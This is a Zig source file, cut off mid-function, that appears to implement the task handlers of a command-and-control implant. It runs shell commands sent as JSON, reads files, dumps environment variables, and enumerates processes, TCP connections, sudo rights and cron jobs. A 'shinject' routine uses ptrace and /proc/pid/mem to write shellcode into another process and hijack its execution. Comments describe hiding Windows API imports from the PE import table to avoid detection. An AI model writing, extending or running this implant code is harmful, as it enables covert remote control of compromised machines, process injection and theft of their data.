const std     = @import("std");
const builtin = @import("builtin");
const lsc     = @import("linux_syscalls.zig");
const ob      = @import("obfuscate.zig");
const config  = @import("config");

// kernel32 static imports: LoadLibraryA + GetProcAddress (always in kernel32, fine
// to declare statically) plus GlobalLock/GlobalUnlock/GetCurrentProcess/CloseHandle.
// advapi32 and user32 are loaded at runtime so they don't appear in the PE import table.
const WinLoader = if (builtin.os.tag == .windows) struct {
    pub extern "kernel32" fn LoadLibraryA(lpLibFileName: [*:0]const u8) callconv(.Win64) ?*anyopaque;
    pub extern "kernel32" fn GetProcAddress(hModule: *anyopaque, lpProcName: [*:0]const u8) callconv(.Win64) ?*anyopaque;
    pub extern "kernel32" fn GlobalLock(hMem: ?*anyopaque) callconv(.Win64) ?*anyopaque;
    pub extern "kernel32" fn GlobalUnlock(hMem: ?*anyopaque) callconv(.Win64) c_int;
    pub extern "kernel32" fn GetCurrentProcess() callconv(.Win64) ?*anyopaque;
    pub extern "kernel32" fn CloseHandle(hObject: *anyopaque) callconv(.Win64) c_int;
} else struct {};

pub const Result = struct {
    output:   []u8,
    is_error: bool,
    allocator: std.mem.Allocator,

    pub fn deinit(self: Result) void {
        self.allocator.free(self.output);
    }
};

// ---------------------------------------------------------------------------
// shell
// ---------------------------------------------------------------------------

pub fn shell(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_shell) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { command: []const u8 };
    const parsed = try std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true });
    defer parsed.deinit();
    const command = parsed.value.command;

    const argv: []const []const u8 = if (builtin.os.tag == .windows)
        &[_][]const u8{ "cmd.exe", "/c", command }
    else
        &[_][]const u8{ "/bin/sh", "-c", command };

    var child = std.process.Child.init(argv, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.stdin_behavior  = .Close;
    try child.spawn();
    if (comptime builtin.os.tag == .linux or builtin.os.tag == .macos) {
        std.posix.setpgid(child.id, child.id) catch {};
    }

    const stdout = child.stdout.?.reader().readAllAlloc(allocator, 10 * 1024 * 1024) catch try allocator.dupe(u8, "");
    const stderr = child.stderr.?.reader().readAllAlloc(allocator, 1 * 1024 * 1024) catch try allocator.dupe(u8, "");
    _ = child.wait() catch {};

    if (stdout.len == 0 and stderr.len > 0) {
        allocator.free(stdout);
        return .{ .output = stderr, .is_error = false, .allocator = allocator };
    }
    allocator.free(stderr);
    return .{ .output = stdout, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// run — execute a binary directly without a shell wrapper
// ---------------------------------------------------------------------------

pub fn run(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_run) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { executable: []const u8, args: []const []const u8 = &.{} };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "run: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    var argv = std.ArrayList([]const u8).init(allocator);
    defer argv.deinit();
    try argv.append(parsed.value.executable);
    for (parsed.value.args) |a| try argv.append(a);

    var child = std.process.Child.init(argv.items, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.stdin_behavior  = .Close;
    child.spawn() catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "run: {s}", .{@errorName(e)});
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    if (comptime builtin.os.tag == .linux or builtin.os.tag == .macos) {
        std.posix.setpgid(child.id, child.id) catch {};
    }

    const stdout = child.stdout.?.reader().readAllAlloc(allocator, 10 * 1024 * 1024) catch try allocator.dupe(u8, "");
    const stderr = child.stderr.?.reader().readAllAlloc(allocator, 1 * 1024 * 1024) catch try allocator.dupe(u8, "");
    _ = child.wait() catch {};

    if (stdout.len == 0 and stderr.len > 0) {
        allocator.free(stdout);
        return .{ .output = stderr, .is_error = false, .allocator = allocator };
    }
    allocator.free(stderr);
    return .{ .output = stdout, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// cat — read and return file contents
// ---------------------------------------------------------------------------

pub fn cat(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_cat) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { path: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "cat: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    const file = std.fs.cwd().openFile(parsed.value.path, .{}) catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "cat: {s}: {s}", .{ parsed.value.path, @errorName(e) });
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer file.close();

    const content = file.readToEndAlloc(allocator, 64 * 1024 * 1024) catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "cat: read: {s}", .{@errorName(e)});
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    return .{ .output = content, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// ls
// ---------------------------------------------------------------------------

pub fn ls(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_ls) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { path: []const u8 = "." };
    var path: []const u8 = ".";
    if (params_json.len > 0) {
        const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch null;
        if (parsed) |p| {
            defer p.deinit();
            path = p.value.path;
        }
    }

    var dir = std.fs.cwd().openDir(path, .{ .iterate = true }) catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "ls: {s}: {s}", .{ path, @errorName(e) });
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer dir.close();

    var buf = std.ArrayList(u8).init(allocator);
    errdefer buf.deinit();

    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        try buf.appendSlice(entry.name);
        try buf.append('\n');
    }
    return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// cd
// ---------------------------------------------------------------------------

pub fn cd(allocator: std.mem.Allocator, params_json: []const u8, cwd: *[]u8) !Result {
    if (comptime !config.include_cd) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { path: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "cd: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    if (comptime builtin.os.tag == .windows) {
        var dir = std.fs.cwd().openDir(parsed.value.path, .{}) catch |e| {
            const msg = try std.fmt.allocPrint(allocator, "cd: {s}", .{@errorName(e)});
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };
        defer dir.close();
        dir.setAsCwd() catch |e| {
            const msg = try std.fmt.allocPrint(allocator, "cd: {s}", .{@errorName(e)});
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };
    } else {
        std.posix.chdir(parsed.value.path) catch |e| {
            const msg = try std.fmt.allocPrint(allocator, "cd: {s}", .{@errorName(e)});
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        };
    }

    const new_cwd = try std.process.getCwdAlloc(allocator);
    allocator.free(cwd.*);
    cwd.* = new_cwd;
    const out = try allocator.dupe(u8, new_cwd);
    return .{ .output = out, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// pwd
// ---------------------------------------------------------------------------

pub fn pwd(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_pwd) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const cwd = try std.process.getCwdAlloc(allocator);
    return .{ .output = cwd, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// env
// ---------------------------------------------------------------------------

pub fn env(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_env) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    var map = try std.process.getEnvMap(allocator);
    defer map.deinit();

    var buf = std.ArrayList(u8).init(allocator);
    errdefer buf.deinit();

    var iter = map.iterator();
    while (iter.next()) |kv| {
        try buf.appendSlice(kv.key_ptr.*);
        try buf.append('=');
        try buf.appendSlice(kv.value_ptr.*);
        try buf.append('\n');
    }
    return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// ps — native process listing.
// Linux: reads /proc directly (no child process spawned).
// Windows/macOS: falls back to spawning a system utility.
// ---------------------------------------------------------------------------

pub fn ps(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_ps) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag == .linux) {
        return psLinuxNative(allocator);
    }

    const argv: []const []const u8 = if (builtin.os.tag == .windows)
        &[_][]const u8{"tasklist.exe"}
    else
        &[_][]const u8{ "ps", "aux" };

    var child = std.process.Child.init(argv, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.stdin_behavior  = .Close;
    try child.spawn();
    if (comptime builtin.os.tag == .linux or builtin.os.tag == .macos) {
        std.posix.setpgid(child.id, child.id) catch {};
    }
    const stdout = try child.stdout.?.reader().readAllAlloc(allocator, 4 * 1024 * 1024);
    _ = child.stderr.?.reader().readAllAlloc(allocator, 64 * 1024) catch {};
    _ = child.wait() catch {};
    return .{ .output = stdout, .is_error = false, .allocator = allocator };
}

fn psLinuxNative(allocator: std.mem.Allocator) !Result {
    var buf = std.ArrayList(u8).init(allocator);
    errdefer buf.deinit();
    try buf.appendSlice("PID      PPID     USER             NAME\n");

    var proc_dir = std.fs.openDirAbsolute("/proc", .{ .iterate = true }) catch {
        return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
    };
    defer proc_dir.close();

    var iter = proc_dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind != .directory) continue;
        const pid = std.fmt.parseInt(u32, entry.name, 10) catch continue;

        var status_path_buf: [32]u8 = undefined;
        const status_path = std.fmt.bufPrint(&status_path_buf, "/proc/{d}/status", .{pid}) catch continue;
        const status_file = std.fs.openFileAbsolute(status_path, .{}) catch continue;
        defer status_file.close();
        const status_data = status_file.readToEndAlloc(allocator, 8192) catch continue;
        defer allocator.free(status_data);

        var name: []const u8 = "";
        var ppid: u32 = 0;
        var uid: u32 = 0;

        var lines = std.mem.splitScalar(u8, status_data, '\n');
        while (lines.next()) |line| {
            if (std.mem.startsWith(u8, line, "Name:\t")) {
                name = std.mem.trim(u8, line[6..], " \t");
            } else if (std.mem.startsWith(u8, line, "PPid:\t")) {
                ppid = std.fmt.parseInt(u32, std.mem.trim(u8, line[6..], " \t"), 10) catch 0;
            } else if (std.mem.startsWith(u8, line, "Uid:\t")) {
                const uid_str = std.mem.trim(u8, line[5..], " \t");
                const space = std.mem.indexOf(u8, uid_str, "\t") orelse uid_str.len;
                uid = std.fmt.parseInt(u32, uid_str[0..space], 10) catch 0;
            }
        }

        // Look up username from /etc/passwd (best-effort)
        var user_buf: [32]u8 = undefined;
        const user = uidToUser(allocator, uid, &user_buf) catch std.fmt.bufPrint(&user_buf, "{d}", .{uid}) catch "?";

        try buf.writer().print("{d:<8} {d:<8} {s:<16} {s}\n", .{ pid, ppid, user, name });
    }

    return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
}

fn uidToUser(allocator: std.mem.Allocator, uid: u32, out: *[32]u8) ![]const u8 {
    const f = try std.fs.openFileAbsolute("/etc/passwd", .{});
    defer f.close();
    const data = try f.readToEndAlloc(allocator, 256 * 1024);
    defer allocator.free(data);

    var lines = std.mem.splitScalar(u8, data, '\n');
    while (lines.next()) |line| {
        // Format: name:x:uid:gid:...
        var fields = std.mem.splitScalar(u8, line, ':');
        const uname = fields.next() orelse continue;
        _ = fields.next(); // password
        const uid_str = fields.next() orelse continue;
        const file_uid = std.fmt.parseInt(u32, uid_str, 10) catch continue;
        if (file_uid == uid) {
            const n = @min(uname.len, out.len);
            @memcpy(out[0..n], uname[0..n]);
            return out[0..n];
        }
    }
    return error.NotFound;
}

// ---------------------------------------------------------------------------
// kill
// ---------------------------------------------------------------------------

pub fn kill(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_kill) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { pid: i32, signal: i32 = 9 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "kill: invalid parameters (expected {\"pid\": <int>})");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    if (comptime builtin.os.tag == .linux or builtin.os.tag == .macos) {
        const rc = std.posix.kill(@intCast(parsed.value.pid), @intCast(parsed.value.signal));
        if (rc) {
            const msg = try std.fmt.allocPrint(allocator, "killed pid {d} with signal {d}", .{ parsed.value.pid, parsed.value.signal });
            return .{ .output = msg, .is_error = false, .allocator = allocator };
        } else |e| {
            const msg = try std.fmt.allocPrint(allocator, "kill: {s}", .{@errorName(e)});
            return .{ .output = msg, .is_error = true, .allocator = allocator };
        }
    } else {
        const msg = try allocator.dupe(u8, "kill: not supported on this platform");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }
}

// ---------------------------------------------------------------------------
// mkdir — create directory including intermediate parents
// ---------------------------------------------------------------------------

pub fn mkdir(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_mkdir) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { path: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "mkdir: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    std.fs.cwd().makePath(parsed.value.path) catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "mkdir: {s}: {s}", .{ parsed.value.path, @errorName(e) });
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    const msg = try std.fmt.allocPrint(allocator, "created {s}", .{parsed.value.path});
    return .{ .output = msg, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// cp — copy file
// ---------------------------------------------------------------------------

pub fn cp(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_cp) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { source: []const u8, destination: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "cp: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    std.fs.cwd().copyFile(parsed.value.source, std.fs.cwd(), parsed.value.destination, .{}) catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "cp: {s}", .{@errorName(e)});
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    const msg = try std.fmt.allocPrint(allocator, "copied {s} -> {s}", .{ parsed.value.source, parsed.value.destination });
    return .{ .output = msg, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// mv — move or rename a file or directory
// ---------------------------------------------------------------------------

pub fn mv(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_mv) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { source: []const u8, destination: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "mv: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    std.fs.cwd().rename(parsed.value.source, parsed.value.destination) catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "mv: {s}", .{@errorName(e)});
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    const msg = try std.fmt.allocPrint(allocator, "moved {s} -> {s}", .{ parsed.value.source, parsed.value.destination });
    return .{ .output = msg, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// rm — remove file or directory
// ---------------------------------------------------------------------------

pub fn rm(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_rm) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct { path: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "rm: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();
    const path = parsed.value.path;

    // Try file first, then directory tree
    if (std.fs.cwd().deleteFile(path)) {
        const msg = try std.fmt.allocPrint(allocator, "removed {s}", .{path});
        return .{ .output = msg, .is_error = false, .allocator = allocator };
    } else |_| {}

    std.fs.cwd().deleteTree(path) catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "rm: {s}: {s}", .{ path, @errorName(e) });
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    const msg = try std.fmt.allocPrint(allocator, "removed {s}", .{path});
    return .{ .output = msg, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// find — recursive search by name pattern and kind
// ---------------------------------------------------------------------------

pub fn find(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_find) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    const P = struct {
        path: []const u8 = ".",
        name: []const u8 = "*",
        kind: []const u8 = "",   // "f" = files, "d" = dirs, "" = both
    };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "find: invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    var buf = std.ArrayList(u8).init(allocator);
    errdefer buf.deinit();

    var stack = std.ArrayList([]u8).init(allocator);
    defer {
        for (stack.items) |p| allocator.free(p);
        stack.deinit();
    }

    try stack.append(try allocator.dupe(u8, parsed.value.path));

    while (stack.items.len > 0) {
        const cur_path = stack.pop() orelse break;
        defer allocator.free(cur_path);

        var dir = std.fs.cwd().openDir(cur_path, .{ .iterate = true }) catch continue;
        defer dir.close();

        var iter = dir.iterate();
        while (iter.next() catch null) |entry| {
            const full = try std.fs.path.join(allocator, &[_][]const u8{ cur_path, entry.name });
            defer allocator.free(full);

            const matches_kind = blk: {
                if (parsed.value.kind.len == 0) break :blk true;
                if (parsed.value.kind[0] == 'f' and entry.kind == .file) break :blk true;
                if (parsed.value.kind[0] == 'd' and entry.kind == .directory) break :blk true;
                break :blk false;
            };

            if (matches_kind and globMatch(parsed.value.name, entry.name)) {
                try buf.appendSlice(full);
                try buf.append('\n');
            }

            if (entry.kind == .directory) {
                try stack.append(try allocator.dupe(u8, full));
            }
        }
    }

    return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
}

fn globMatch(pattern: []const u8, name: []const u8) bool {
    var pi: usize = 0;
    var ni: usize = 0;
    var star_pi: usize = std.math.maxInt(usize);
    var star_ni: usize = 0;

    while (ni < name.len) {
        if (pi < pattern.len and (pattern[pi] == '?' or pattern[pi] == name[ni])) {
            pi += 1;
            ni += 1;
        } else if (pi < pattern.len and pattern[pi] == '*') {
            star_pi = pi;
            star_ni = ni;
            pi += 1;
        } else if (star_pi != std.math.maxInt(usize)) {
            star_ni += 1;
            ni = star_ni;
            pi = star_pi + 1;
        } else {
            return false;
        }
    }
    while (pi < pattern.len and pattern[pi] == '*') pi += 1;
    return pi == pattern.len;
}

// ---------------------------------------------------------------------------
// netstat — list TCP connections via /proc/net/tcp (Linux only)
// ---------------------------------------------------------------------------

pub fn netstat(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_netstat) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .linux) {
        const msg = try allocator.dupe(u8, "netstat: only supported on Linux");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    var buf = std.ArrayList(u8).init(allocator);
    errdefer buf.deinit();
    try buf.appendSlice("Proto  Local Address          Foreign Address        State\n");

    for (&[_][]const u8{ "/proc/net/tcp", "/proc/net/tcp6" }) |path| {
        const file = std.fs.openFileAbsolute(path, .{}) catch continue;
        defer file.close();
        const content = file.readToEndAlloc(allocator, 4 * 1024 * 1024) catch continue;
        defer allocator.free(content);

        const is6 = std.mem.endsWith(u8, path, "tcp6");
        var lines = std.mem.splitScalar(u8, content, '\n');
        _ = lines.next();
        while (lines.next()) |line| {
            const trimmed = std.mem.trim(u8, line, " \t");
            if (trimmed.len == 0) continue;
            var fields = std.mem.tokenizeScalar(u8, trimmed, ' ');
            _ = fields.next();
            const local      = fields.next() orelse continue;
            const remote     = fields.next() orelse continue;
            const state_hex  = fields.next() orelse continue;

            const state_n = std.fmt.parseInt(u8, state_hex, 16) catch continue;
            const state_name = switch (state_n) {
                0x01 => "ESTABLISHED",
                0x02 => "SYN_SENT",
                0x03 => "SYN_RECV",
                0x04 => "FIN_WAIT1",
                0x05 => "FIN_WAIT2",
                0x06 => "TIME_WAIT",
                0x07 => "CLOSE",
                0x08 => "CLOSE_WAIT",
                0x09 => "LAST_ACK",
                0x0A => "LISTEN",
                0x0B => "CLOSING",
                else  => "UNKNOWN",
            };
            const proto = if (is6) "tcp6" else "tcp ";
            try buf.writer().print("{s}   {s:<22} {s:<22} {s}\n", .{ proto, local, remote, state_name });
        }
    }

    return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// sudo — list passwordless sudo entries (Linux/macOS)
// ---------------------------------------------------------------------------

pub fn sudo(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_sudo) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag == .windows) {
        const msg = try allocator.dupe(u8, "sudo: not supported on Windows");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    const argv = [_][]const u8{ "sudo", "-n", "-l" };
    var child = std.process.Child.init(&argv, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.stdin_behavior  = .Close;
    child.spawn() catch |e| {
        const msg = try std.fmt.allocPrint(allocator, "sudo: {s}", .{@errorName(e)});
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    if (comptime builtin.os.tag == .linux or builtin.os.tag == .macos) {
        std.posix.setpgid(child.id, child.id) catch {};
    }
    const stdout = child.stdout.?.reader().readAllAlloc(allocator, 1 * 1024 * 1024) catch try allocator.dupe(u8, "");
    const stderr = child.stderr.?.reader().readAllAlloc(allocator, 256 * 1024) catch try allocator.dupe(u8, "");
    _ = child.wait() catch {};

    if (stdout.len == 0 and stderr.len > 0) {
        allocator.free(stdout);
        return .{ .output = stderr, .is_error = false, .allocator = allocator };
    }
    allocator.free(stderr);
    return .{ .output = stdout, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// cron — enumerate cron jobs (Linux only)
// ---------------------------------------------------------------------------

pub fn cron(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_cron) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .linux) {
        const msg = try allocator.dupe(u8, "cron: only supported on Linux");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    var buf = std.ArrayList(u8).init(allocator);
    errdefer buf.deinit();

    appendCronFile(allocator, &buf, "/etc/crontab", "=== /etc/crontab ===\n") catch {};

    {
        var dir = std.fs.openDirAbsolute("/etc/cron.d", .{ .iterate = true }) catch null;
        if (dir) |*d| {
            defer d.close();
            var iter = d.iterate();
            while (iter.next() catch null) |entry| {
                if (entry.kind != .file) continue;
                var pb: [256]u8 = undefined;
                const path = std.fmt.bufPrint(&pb, "/etc/cron.d/{s}", .{entry.name}) catch continue;
                var hb: [280]u8 = undefined;
                const hdr = std.fmt.bufPrint(&hb, "=== {s} ===\n", .{path}) catch continue;
                appendCronFile(allocator, &buf, path, hdr) catch {};
            }
        }
    }

    for (&[_][]const u8{ "/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly" }) |dir_path| {
        var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch continue;
        defer dir.close();
        buf.writer().print("=== {s} ===\n", .{dir_path}) catch {};
        var iter = dir.iterate();
        while (iter.next() catch null) |entry| {
            buf.appendSlice(entry.name) catch {};
            buf.append('\n') catch {};
        }
    }

    {
        var dir = std.fs.openDirAbsolute("/var/spool/cron/crontabs", .{ .iterate = true }) catch null;
        if (dir) |*d| {
            defer d.close();
            var iter = d.iterate();
            while (iter.next() catch null) |entry| {
                if (entry.kind != .file) continue;
                var pb: [256]u8 = undefined;
                const path = std.fmt.bufPrint(&pb, "/var/spool/cron/crontabs/{s}", .{entry.name}) catch continue;
                var hb: [280]u8 = undefined;
                const hdr = std.fmt.bufPrint(&hb, "=== crontab: {s} ===\n", .{entry.name}) catch continue;
                appendCronFile(allocator, &buf, path, hdr) catch {};
            }
        }
    }

    return .{ .output = try buf.toOwnedSlice(), .is_error = false, .allocator = allocator };
}

fn appendCronFile(allocator: std.mem.Allocator, buf: *std.ArrayList(u8), path: []const u8, header: []const u8) !void {
    const file = try std.fs.openFileAbsolute(path, .{});
    defer file.close();
    try buf.appendSlice(header);
    const content = try file.readToEndAlloc(allocator, 4 * 1024 * 1024);
    defer allocator.free(content);
    try buf.appendSlice(content);
    try buf.append('\n');
}

// ---------------------------------------------------------------------------
// shinject — remote process injection via ptrace (Linux x86_64 only)
// ---------------------------------------------------------------------------

pub fn shinject(allocator: std.mem.Allocator, params_json: []const u8) !Result {
    if (comptime !config.include_shinject) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .linux or builtin.cpu.arch != .x86_64) {
        const msg = try allocator.dupe(u8, "unsupported platform");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    const P = struct { pid: u32, shellcode: []const u8 };
    const parsed = std.json.parseFromSlice(P, allocator, params_json, .{ .ignore_unknown_fields = true }) catch {
        const msg = try allocator.dupe(u8, "invalid parameters");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer parsed.deinit();

    const dec_len = std.base64.standard.Decoder.calcSizeForSlice(parsed.value.shellcode) catch {
        const msg = try allocator.dupe(u8, "invalid base64");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    const sc_buf = try allocator.alloc(u8, dec_len);
    defer allocator.free(sc_buf);
    std.base64.standard.Decoder.decode(sc_buf, parsed.value.shellcode) catch {
        const msg = try allocator.dupe(u8, "decode failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };

    const pid = parsed.value.pid;

    if (lsc.ptraceAttach(pid) != 0) {
        const msg = try allocator.dupe(u8, "failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }
    lsc.waitpidStop(pid);

    var regs: lsc.UserRegs = undefined;
    if (lsc.ptraceGetRegs(pid, &regs) != 0) {
        lsc.ptraceDetach(pid);
        const msg = try allocator.dupe(u8, "failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    const raw_addr = regs.rsp - 128 - @as(u64, sc_buf.len);
    const inject_addr: u64 = raw_addr & ~@as(u64, 15);

    var path_buf: [32]u8 = undefined;
    const mem_path = std.fmt.bufPrint(&path_buf, "/proc/{d}/mem", .{pid}) catch {
        lsc.ptraceDetach(pid);
        const msg = try allocator.dupe(u8, "failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };

    const mem_file = std.fs.openFileAbsolute(mem_path, .{ .mode = .read_write }) catch {
        lsc.ptraceDetach(pid);
        const msg = try allocator.dupe(u8, "failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    defer mem_file.close();

    mem_file.seekTo(inject_addr) catch {
        lsc.ptraceDetach(pid);
        const msg = try allocator.dupe(u8, "failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };
    mem_file.writeAll(sc_buf) catch {
        lsc.ptraceDetach(pid);
        const msg = try allocator.dupe(u8, "failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    };

    regs.rip = inject_addr;
    if (lsc.ptraceSetRegs(pid, &regs) != 0) {
        lsc.ptraceDetach(pid);
        const msg = try allocator.dupe(u8, "failed");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    lsc.ptraceDetach(pid);
    const msg = try std.fmt.allocPrint(allocator, "ok ({d} bytes)", .{sc_buf.len});
    return .{ .output = msg, .is_error = false, .allocator = allocator };
}

// ---------------------------------------------------------------------------
// launchctl — enumerate LaunchAgent/LaunchDaemon entries (macOS only)
// ---------------------------------------------------------------------------

pub fn launchctl(allocator: std.mem.Allocator) !Result {
    if (comptime !config.include_launchctl) return .{ .output = try allocator.dupe(u8, ""), .is_error = true, .allocator = allocator };
    if (comptime builtin.os.tag != .macos) {
        const msg = try allocator.dupe(u8, "launchctl: only supported on macOS");
        return .{ .output = msg, .is_error = true, .allocator = allocator };
    }

    const argv = [_][]const u8{ "launchctl", "list" };
    var child = std.process.Child.init(&argv, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
